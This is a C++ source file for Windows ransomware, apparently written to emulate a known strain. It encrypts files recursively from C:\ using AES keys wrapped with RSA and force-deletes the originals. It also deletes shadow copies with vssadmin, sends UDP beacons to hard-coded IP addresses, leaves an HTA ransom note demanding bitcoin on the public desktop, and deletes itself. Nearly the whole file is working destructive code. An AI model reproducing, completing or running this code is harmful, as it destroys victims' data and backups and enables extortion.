#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include "includes.hpp"
#include "encrypt.cpp"
#include "encrypt.hpp"

namespace fs = std::filesystem;
using namespace std;
#pragma comment(lib, "ws2_32.lib")

// A function to create a file with a given name and content
void create_file(string name, string content) {
    ofstream file(name);
    file << content;
    file.close();
}

// A function to run a command and hide the console window
void run_command(string command) {
    system(((command).c_str()));
}

// A function to encrypt a file using AES-256 and RSA
//void encrypt_file(string filename) {
//    run_command("C:\\temp\\data\\sgf.exe -e "+filename);
//}

// A function to create UDP traffic on port 6892 to given addresses
void create_traffic(vector<string> addresses) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    for (string address : addresses) {
        sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(6892);
        dest.sin_addr.s_addr = inet_addr(address.c_str());
        sendto(sock, "Hello", 5, 0, (sockaddr*)&dest, sizeof(dest));
        Sleep(1000);
    }
    closesocket(sock);
}

BOOL RansomFile(const char* szFileName)
{
	BOOL bResult = FALSE;

	PBYTE pbEncryptedAESKey = nullptr;
	DWORD dwEncryptedAESKeyLen = 0;

	PBYTE pbPlaintextFileData = nullptr;
	DWORD dwPlaintextFileDataLen = 0;

	PBYTE pbEncryptedFileData = nullptr;
	DWORD dwEncryptedFileDataLen = 0;

	BYTE pbKey[16]{ };
	DWORD dwKeyLen = sizeof(pbKey);

	BYTE pbIV[16]{ };
	DWORD dwIVLen = sizeof(pbIV);

	HANDLE hFile = nullptr;

	//
	// Read file from disk
	//
	bResult = ReadFileToByteArray(szFileName, &pbPlaintextFileData, &dwPlaintextFileDataLen);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- ReadFileToByteArray failed!\n");
		goto Exit;
	}

	//
	// Generate crypto random IV and AES key
	//
	::BCryptGenRandom(NULL, pbKey, dwKeyLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	::BCryptGenRandom(NULL, pbIV, dwIVLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

	{
		//
		// Encrypt the AES key first.
		//
		bResult = RSAEncrypt(
			pbKey,
			dwKeyLen,
			&pbEncryptedAESKey,
			&dwEncryptedAESKeyLen
		);
		if (!bResult)
		{
			printf(__FUNCTION__ " -- RSAEncrypt failed!\n");
			goto Exit;
		}

		//
		// Encrypt the actual file
		//
		bResult = AESEncrypt(
			pbPlaintextFileData,
			dwPlaintextFileDataLen,
			pbKey,
			dwKeyLen,
			pbIV,
			dwIVLen,
			&pbEncryptedFileData,
			&dwEncryptedFileDataLen
		);
		if (!bResult)
		{
			printf(__FUNCTION__ " -- AESEncrypt failed!\n");
			goto Exit;
		}

		//
		// Create the .ransom file
		//
		char szNewPath[MAX_PATH]{ };
		strcpy_s(szNewPath, szFileName);
		::PathRemoveExtensionA(szNewPath);
		strcat_s(szNewPath, ".94d4");

		hFile = ::CreateFileA(
			szNewPath,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			nullptr
		);
		if (!hFile || hFile == INVALID_HANDLE_VALUE)
		{
			bResult = FALSE;
			printf(__FUNCTION__ " -- CreateFileA failed %d\n", ::GetLastError());
			goto Exit;
		}

		//
		// Encrypted file format order:
		// IV -> AES RSA Encrypted Key -> AES Encrypted File Data
		//
		DWORD dwWritten = 0;
		::WriteFile(hFile, pbIV, dwIVLen, &dwWritten, nullptr);
		::WriteFile(hFile, pbEncryptedAESKey, dwEncryptedAESKeyLen, &dwWritten, nullptr);
		::WriteFile(hFile, pbEncryptedFileData, dwEncryptedFileDataLen, &dwWritten, nullptr);
	}

Exit:
	if (hFile)
		::CloseHandle(hFile);

	if (pbEncryptedAESKey)
		::HeapFree(::GetProcessHeap(), 0, pbEncryptedAESKey);

	if (pbPlaintextFileData)
		::VirtualFree(pbPlaintextFileData, 0, MEM_RELEASE);

	if (pbEncryptedFileData)
		::VirtualFree(pbEncryptedFileData, 0, MEM_RELEASE);

	return bResult;
}

// A function to encrypt all files in a given folder
void encrypt_folder(string folder) {
    for (auto& p : fs::directory_iterator(folder)) {
        if (p.is_regular_file()) {
			RansomFile((p.path().string()).c_str());
			run_command("del /f /q "+ (p.path().string()));
        }
        else if (p.is_directory()) {
            encrypt_folder(p.path().string());
        }
    }
}

int main() {
    // Create files with given names and contents under AppData\Local\Temp\

    string appdata = std::getenv("APPDATA");
    string temp = appdata + "\\..\\Local\\Temp\\";
    create_file(temp + "floppy_disk.png", "This is a floppy disk image");
    create_file(temp + "floppy_disk_disabled.png", "This is a disabled floppy disk image");
    create_file(temp + "flat.xsl", "This is a spreadsheet file");
    create_file(temp + "Diacid.cpmO", "This is a binary file");
    create_file(temp + "nsmAD93.tmp\\System.dll", "This is a dynamic link library file");
    create_file(temp + "collages.dll", "This is another dynamic link library file");
    // Run adaptertroubleshooter.exe and bthudtask.exe
    run_command("adaptertroubleshooter.exe");
    run_command("bthudtask.exe");
    // Run System.dll file
    run_command(temp + "nsmAD93.tmp\\System.dll");
    //Encrypt
    //encrypt_file("C:\\temp\\test.txt");
    encrypt_folder("C:\\");
    // Remove shadow copies
    run_command("vssadmin delete shadows /all /quiet");
    // Create UDP traffic on port 6892 to given addresses
    vector<string> addresses = { "97.15.12.185", "91.239.24.52", "92.12.15.97", "93.24.239.91" };
    create_traffic(addresses);
    // Display ransom message through Desktop\_HELP_DECRYPT_N0BR8ST0_.hta file
    string ransom_message = "<html><head><title>Oops, your files have been encrypted!</title></head><body><h1>Oops, your files have been encrypted!</h1><p>Your important files are encrypted using a unique public key generated for this computer. To decrypt the files, you need to obtain the private key.</p><p>The single copy of the private key, which will allow you to decrypt the files, located on a secret server on the Internet; the server will destroy the key after 72 hours.</p><p>To retrieve the private key, you need to pay 1 bitcoin to the following address: 1N0BR8ST0XyzABCdEfGh1234.</p><p>After you've made the payment, send us an email with your transaction ID and your ID key and we will send you the private key.</p><p>Your ID key is: 94D4-ABCD-EFGH-1234</p></body></html>";
    create_file("C:\\Users\\Public\\Desktop\\_HELP_DECRYPT_N0BR8ST0_.hta", ransom_message);
    // Delete itself
    run_command("del /f /q %0");
    return 0;
}